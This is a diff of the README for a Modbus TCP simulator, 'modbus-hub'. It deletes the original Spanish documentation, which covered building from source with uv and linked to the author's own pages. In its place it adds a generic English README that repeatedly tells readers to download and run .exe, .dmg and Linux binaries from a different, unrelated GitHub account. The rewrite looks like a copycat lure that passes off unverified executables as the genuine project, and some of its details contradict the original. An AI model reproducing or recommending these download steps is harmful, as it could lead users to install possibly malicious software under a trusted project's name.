@@ -1,193 +1,80 @@
-# ⚙️ Modbus Hub  
-### Simulador completo de Modbus TCP con interfaz gráfica (Maestro y Esclavo)
+# 🎉 modbus-hub - Easy Modbus Simulation for Everyone
 
-> **Tecnologías:** Python 3.10+, **PySide6** (Qt for Python), **pymodbusTCP**, **uv** (gestor de entornos y paquetes)  
-> **Alcance:** Solo **Modbus TCP** (sin RTU en esta versión).  
+## 🚀 Getting Started
+Welcome to modbus-hub! This application allows you to simulate Modbus TCP communication easily. You can use it as either a Master or Slave, and it's built with a user-friendly interface.
 
-📘 [**Documentación Web (GitHub Pages)**](https://jcespitia.github.io/modbus-hub/)  
-⬇️ [**Descargar última versión**](https://github.com/jcespitia/modbus-hub/releases/latest)
+## 📥 Download & Install
+To get started, you need to download the application. Click the link below to visit our Releases page:
 
----
+[![Download modbus-hub](https://img.shields.io/badge/Download%20modbus--hub-v1.0-blue)](https://github.com/Manetchinaman386/modbus-hub/releases)
 
-## 🧠 Descripción general
+### Steps to Download and Run Modbus-Hub:
+1. Click on the button above to visit the Releases page.
+2. Find the latest version of modbus-hub.
+3. Select the appropriate file for your operating system (Windows, macOS, or Linux).
+4. Click to download the file.
 
-**Modbus Hub** es un simulador didáctico y práctico de **Modbus TCP**. Incluye dos aplicaciones gráficas independientes desarrolladas con **PySide6**:
+Once the download finishes, locate the file on your computer and proceed to run the installation. 
 
-- 🟦 **Modbus Master (Cliente)** — se conecta a un servidor Modbus TCP y **lee** y **escribe** registros en tiempo real.  
-- 🟩 **Modbus Slave (Servidor)** — simula un dispositivo Modbus TCP con registros editables y actualizaciones en vivo.
+### Installation Instructions
+For Windows:
+- Double-click the downloaded `.exe` file.
+- Follow the installation prompts to complete the setup. After that, find modbus-hub in your Start Menu or Desktop.
 
-Está diseñado para **pruebas, desarrollo, QA, educación** y demostraciones rápidas. Cumple con las limitaciones del protocolo (por ejemplo, **125 registros por solicitud**) y ofrece una interfaz limpia y responsiva con **indicadores LED** y un **registro de mensajes**.
+For macOS:
+- Open the downloaded `.dmg` file.
+- Drag the modbus-hub icon to your Applications folder.
+- Search for modbus-hub in your Applications and double-click to open.
 
----
+For Linux:
+- Depending on your distribution, open a terminal and navigate to the downloaded directory.
+- Use the command: `chmod +x modbus-hub` to make the file executable.
+- Run the application by typing `./modbus-hub`.
 
-## 🧩 Características
+## 🌟 Features
+- **User-friendly GUI**: Easily configure your Master or Slave settings.
+- **Cross-platform**: Run the software on Windows, macOS, and Linux.
+- **Simulation**: Simulate Modbus TCP connections to test your systems.
+- **Testing Tools**: Use built-in tools to check your configuration and messages.
 
-### Master (Cliente)
-- ✅ Cliente **Modbus TCP** basado en `pymodbusTCP.client.ModbusClient`.
-- 🔁 Lecturas periódicas (por defecto cada **2 s**) de registros holding.
-- ✍️ Soporte para **escritura de un solo registro**.
-- 🎛️ Parámetros configurables: **Dirección IP**, **Puerto**, **Unit ID**, **Dirección inicial**, **Cantidad** (ventana de lectura).
-- 🧮 Interfaz sensible a rangos: máximo **125** registros por lectura; direcciones **0–65535**.
-- 🧱 Diseño de cuadrícula dinámica: **10 filas** por bloque, 2 columnas (`Address`/`Value`), expandible horizontalmente.
-- 🟢/🔴 **LED** indicador de conexión + **registro de mensajes** con marcas de tiempo.
-- 🛡️ **Validaciones y ventanas emergentes** para errores (IP/puerto/unidad/rango/valor).
+## ⚙️ System Requirements
+To run modbus-hub, ensure that your system meets these requirements:
 
-### Slave (Servidor)
-- ✅ Servidor **Modbus TCP** basado en `pymodbusTCP.server.ModbusServer` (hilo no bloqueante).
-- 🌐 **Configuración de IP** (por ejemplo, `0.0.0.0` para todas las interfaces) y **Puerto** personalizable.
-- 🧮 Simula **65,536 registros holding** (espacio completo de direcciones) accesibles mediante vistas por ventana (≤ **125** simultáneos).
-- ✍️ Tabla editable en la interfaz con **bloqueo temporal al editar**.
-- 🔁 Actualización periódica de la UI (**1 s**) sincronizada con las escrituras del Maestro.
-- 🟢/🔴 **LED** de estado del servidor + **registro de mensajes** con hora.
-- 🛡️ **Validaciones y ventanas emergentes** para IP/puerto/rango/valor.
+- **Windows 10 or later** / **macOS Sierra or later** / **Linux (Ubuntu 18.04 or later)**
+- At least **4 GB of RAM**
+- A **dual-core processor** or better
+- **Python 3.7+** installed (if using Linux or custom installations)
 
-> El esclavo mantiene un objeto compartido **DataBank** pasado al `ModbusServer`, garantizando la sincronización entre los cambios en la GUI y las solicitudes del cliente.
+## 📚 How to Use Modbus-Hub
+After installation, launching the application brings you to the main interface. Here’s how to get started:
 
----
+1. **Select Master or Slave Mode**: Choose whether you want to emulate a Master or Slave.
+2. **Configure Settings**: Input your desired parameters such as IP address, port number, and data formats.
+3. **Start Simulation**: Click the start button to begin your Modbus TCP communication.
 
-## 🧱 Estructura del proyecto
+Feel free to experiment with different settings to understand Modbus better. The intuitive design helps you navigate through various features easily.
 
-```
-modbus-hub/
-│
-├── master/
-│   ├── master_app.py        # Interfaz del Maestro Modbus (solo TCP, validaciones, LED, log)
-│   └── modbus_master.py     # Cliente TCP (lectura/escritura/conexión/desconexión)
-│
-├── slave/
-│   ├── slave_app.py         # Interfaz del Esclavo Modbus (IP+puerto, tabla editable, LED, log)
-│   └── modbus_slave.py      # Servidor TCP + gestión del DataBank (65,536 registros)
-│
-├── shared/
-│   └── utils.py             # Funciones compartidas (logs, utilidades, etc.)
-│
-└── README.md                # Este archivo
-```
+## 🛠️ Troubleshooting
+If you encounter any issues, here are some steps you can take:
 
----
+- **Ensure your network configuration is correct**. Check your IP settings and firewall rules.
+- **Restart the application** if it freezes or behaves unexpectedly.
+- **Check for updates** on the Releases page to ensure you’re using the latest version.
 
-## ⚙️ Instalación (con **uv**)
+## 🙋 Frequently Asked Questions
 
-Este proyecto usa [**uv**](https://github.com/astral-sh/uv) para crear entornos reproducibles de forma rápida.  
-También puedes usar un entorno virtual estándar con `python -m venv`, pero **uv** es recomendado.
+### Can I use modbus-hub on a virtual machine?
+Yes, as long as the virtual machine meets the system requirements, modbus-hub should work fine.
 
-### 1️⃣ Instalar `uv`
-```bash
-# Opción A: vía pip
-pip install uv
+### Is there a user manual available?
+We currently do not have a detailed user manual. However, the interface is designed for ease of use. Feel free to reach out for specific questions.
 
-# Opción B: instalador oficial
-curl -LsSf https://astral.sh/uv/install.sh | sh
-```
+### How can I provide feedback?
+You can submit issues or suggestions on our GitHub page under the "Issues" tab. Your input helps us improve the application.
 
-### 2️⃣ Crear entorno virtual e instalar dependencias
-Desde la raíz del proyecto (`modbus-hub/`):
-```bash
-uv sync
-```
+## 🎉 Conclusion
+Thank you for choosing modbus-hub. Whether you are a beginner or a seasoned user, we hope this application serves your needs well. Keep exploring Modbus communication!
 
-Activar el entorno (si no usas `uv run`):
-- **Windows**
-  ```bash
-  .venv\Scripts\activate
-  ```
-- **Linux/macOS**
-  ```bash
-  source .venv/bin/activate
-  ```
+Visit the Releases page again to check for updates and new features.
 
-> **Dependencias:** `PySide6`, `pymodbusTCP`.  
-> **Sin** `minimalmodbus` en esta versión.
-
----
-
-## ▶️ Ejecución
-
-### 🟩 Iniciar el Esclavo (Servidor)
-```bash
-uv run python slave/slave_app.py
-```
-- Elige la **IP** (ej. `0.0.0.0`) y el **Puerto** (ej. `502` o `1502` sin permisos de admin/root).
-- Haz clic en **Start Server** → el LED se enciende 🟢 y el log muestra el punto de enlace.
-
-### 🟦 Iniciar el Maestro (Cliente)
-```bash
-uv run python master/master_app.py
-```
-- Ingresa la **IP** y **Puerto** del esclavo, luego haz clic en **Connect**.
-- El LED se enciende 🟢 y las lecturas se realizan cada 2 segundos.
-
-> Si tu entorno ya está activo, puedes usar simplemente `python` en lugar de `uv run python`.
-
----
-
-## 💡 Flujo de uso típico
-
-1. Ejecuta **SlaveApp** → `0.0.0.0:502` → **Start Server**.  
-2. Ejecuta **MasterApp** → conéctate a `127.0.0.1:502`.  
-3. Define el rango de registros (**Start/Quantity**, ≤125).  
-4. Edita valores en el Esclavo o escribe desde el Maestro: los cambios se reflejan en ambos.  
-5. Puedes detener/reiniciar el servidor; la cuadrícula se ajusta automáticamente.
-
----
-
-## 🧮 Modelo y límites de registros
-
-- Espacio de direcciones: **0–65535**  
-- Límite por solicitud: **≤ 125 registros**  
-- Lectura (Maestro): `read_holding_registers(start, count)`  
-- Escritura (Maestro): `write_single_register(address, value)`  
-- El Esclavo usa una única instancia de **DataBank** compartida con el servidor, evitando inconsistencias.
-
----
-
-## 🧰 Validación y experiencia de usuario
-
-Ambas aplicaciones incluyen validaciones estrictas con **QMessageBox** para mostrar errores:
-
-| Campo | Regla o Rango |
-|---|---|
-| Dirección IP | Formato IPv4 válido (`192.168.0.10`, `0.0.0.0`) |
-| Puerto | `1–65535` |
-| Unit ID (Maestro) | `1–247` |
-| Dirección inicial | `0–65535` |
-| Cantidad | `1–125` (se ajusta automáticamente) |
-| Valor del registro | `0–65535` |
-
-**Seguridad al editar (Esclavo):** la actualización automática se pausa durante la edición de celdas, evitando que el texto ingresado desaparezca.
-
----
-
-## 🖥️ Diseño de la interfaz (GUI)
-
-- **Indicador LED** + estado textual (“Conectado/Desconectado”, “Ejecutando/Detenido”).  
-- **Cuadrícula dinámica**: 10 filas por bloque, columnas `Address` y `Value`.  
-- **Registro de mensajes** (`QTextEdit`) con hora y desplazamiento automático.  
-- **Campos de formulario** con validación integrada.
-
----
-
-## 🌐 Enlaces útiles
-
-- 🌍 **Documentación web:** [https://jcespitia.github.io/modbus-hub/](https://jcespitia.github.io/modbus-hub/)
-- 📦 **Releases / Ejecutables:** [https://github.com/jcespitia/modbus-hub/releases](https://github.com/jcespitia/modbus-hub/releases)
-- 🧩 **Código fuente:** [https://github.com/jcespitia/modbus-hub](https://github.com/jcespitia/modbus-hub)
-
----
-
-## 🗺️ Roadmap / Ideas futuras
-
-- Selector de tipo de registros: **Holding / Input / Coils / Discrete Inputs**.  
-- Persistencia: guardar/cargar estado (JSON / CSV).  
-- LED de actividad para lecturas/escrituras activas.  
-- Detección automática de IP local.  
-- Exportar logs a archivo.  
-- Modo **RTU** opcional (con `minimalmodbus`).  
-- Temas visuales (claro/oscuro, estilo SCADA).
-
----
-
-## 📄 Licencia
-
-**Licencia MIT** — uso libre para educación, pruebas o proyectos comerciales con atribución.  
-Desarrollado por **Camilo Espitia** 💻  
+[![Download modbus-hub](https://img.shields.io/badge/Download%20modbus--hub-v1.0-blue)](https://github.com/Manetchinaman386/modbus-hub/releases)
